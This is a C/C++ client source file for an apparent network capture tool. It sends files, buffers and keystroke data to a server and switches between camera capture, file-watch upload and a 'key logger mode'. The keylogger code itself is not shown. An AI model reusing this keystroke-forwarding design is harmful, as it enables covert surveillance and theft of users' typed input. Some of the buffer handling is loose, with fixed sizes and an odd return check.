#define _CRT_SECURE_NO_WARNINGS

#include <stdio.h>

#ifdef _LINUX
	#include <inotifytools/inotifytools.h>
	#include <inotifytools/inotify.h>
#endif

#include "netcap_common.h"
#include "client.h"
#include "client_opencv.h"
#include "client_keylogger.h"


int client_send_file(const char* filename, const char* serverip, unsigned short port, 
					 File &log)
{
	ClientSocket cs;
	PERF_START();
	
	int ret = cs.open();
	cs.setReuse(1);
	ret = cs.connect(serverip, port);
	if (ret == _ERR) {
		cs.close();
		return _ERR;
	}
	
	// 0. Check Okay
	ret = cs.sendOkay();
	ret = cs.recvOkay();
	
	// 1. send filename 
	File f;
	ret = f.open(filename, File::READ); // ret = 0, no error, ret = 1, error	
	char tmp[1024];
	memset(tmp, 0x00, 1024);
	strcpy(tmp, f.name());
	
	printf("file name : %s\n", f.name());	
	ret = cs.sendStr(tmp);
	
	// 2. send file size
	printf("file size : %d\n", f.size());
	ret = cs.sendInt(f.size());

	// 3. send file contenst
	//int bytesTotal = f.sendTo(cs);  	// using sendfile about 0.25 ms
	f.sendTo(cs);		// using send     about 1.25 ms
	
	PERF_STOP3(f.name(), f.size(), log);
	f.close();	
	cs.close();
	
	return _NOERR;
}

int client_send_buffer(const char* tag, const char* serverip, unsigned short port,
						const char* buf, int bufsize, File &log)
{
	ClientSocket cs;

	int ret = cs.open();
	cs.setReuse(1);
	
	ret = cs.connect(serverip, port);
	if (ret == _ERR) {
		cs.close();
		return _ERR;
	}
	
	char ts[1024];
	ret = cs.send((void *)buf, bufsize);
	int a = (int)buf[0];
	if (ret != 2) { printf("[%s] : send error\n", get_time_stamp2(ts)); }
	cs.close();

	return _NOERR;
}

int client_send_key(const char* serverip, unsigned short port,
					const char* buf, int bufsize)
{
	ClientSocket cs;

	int ret = cs.open();
	cs.setReuse(1);
	cs.setTcpNoDelay(1);

	ret = cs.connect(serverip, port);
	if (ret == _ERR) {
		cs.close();
		return _ERR;
	}

	cs.send((void *)buf, bufsize);
	cs.close();

	return _NOERR;
}


int client_recv_buffer(const char* serverip, unsigned short port,
                       char* buf, int bufsize)
{
	ClientSocket cs;	
	int ret = cs.open();
	cs.setReuse(1);
	
	ret = cs.connect(serverip, port);
	if (ret == _ERR) return _ERR; 
	
	memset(buf, 0x00, 1024);
	cs.recv((void*)buf, 1024);
	cs.close();
	return _NOERR;
}


//
// dummy_client
//

int dummy_client(const char* appname, unsigned short port, 
                 const char* dirname, int mode2,
				 const char* serverip, File &log )
{	
	int ret = 0;
    char buf[1024];
    int bufsize = 1024;
    
	while(1) {
		ret = client_recv_buffer(serverip, port, buf, bufsize);
        printf("-> R : %s\n", buf);
	 } // while 	
	return ret;
}

int dummy_client2(const char* appname, unsigned short port, 
                  const char* dirname, int mode2,
				  const char* serverip, File &log )
{	
	int ret = 0;
    char buf[1024];
//    int bufsize = 1024;

	ClientSocket cs;	
	cs.open();
	cs.setReuse(1);
	
	ret = cs.connect(serverip, port);
	if (ret == _ERR) return _ERR; 
	
	while(1) {
		//ret = client_recv_buffer(serverip, port, buf, bufsize);
        memset(buf, 0x00, 1024);
        cs.recv((void*)buf, 1024);        
        printf("-> R : %s\n", buf);
	 } // while 
     
	printf("cs.close()\n");
	cs.close();
	return _NOERR;
}

int client_main(const char* appname, unsigned short port, 
	            const char* dirname, int mode2, 
		        const char* serverip)
{
	
	char logfile[100];
	sprintf(logfile, "%s.clent.log", appname);
	File log;
	log.open(logfile, File::WRITE);
	log.print(1, (char*)"===== %s client to %s(%d) ", appname, serverip, port);
	
	int ret = 0;
	if ( (mode2 == 0) || (mode2==1)) {
        log.print(1, (char*)"capture client \n");
		ret = capture_client(appname, port, dirname, mode2, serverip, log);
	} else if (mode2 == 2) {
        log.print(1, (char*)"inotify client \n");
		ret = inotify_client(appname, port, dirname, mode2, serverip, log);		
	} else if (mode2 == 3) {
        log.print(1, (char*)"dummy client - recv per connect \n");        
		ret = dummy_client(appname, port, dirname, mode2, serverip, log);
	} else if (mode2 == 4) {
        log.print(1, (char*)"dummy client(2) - recv without socket close \n"); 
		ret = dummy_client2(appname, port, dirname, mode2, serverip, log);
	} else if (mode2 == 5) {
		log.print(1, (char*)"key logger mode \n");
		ret = client_keylogger(appname, port, dirname, mode2, serverip, log);
 }
	log.close();
	return ret;
}
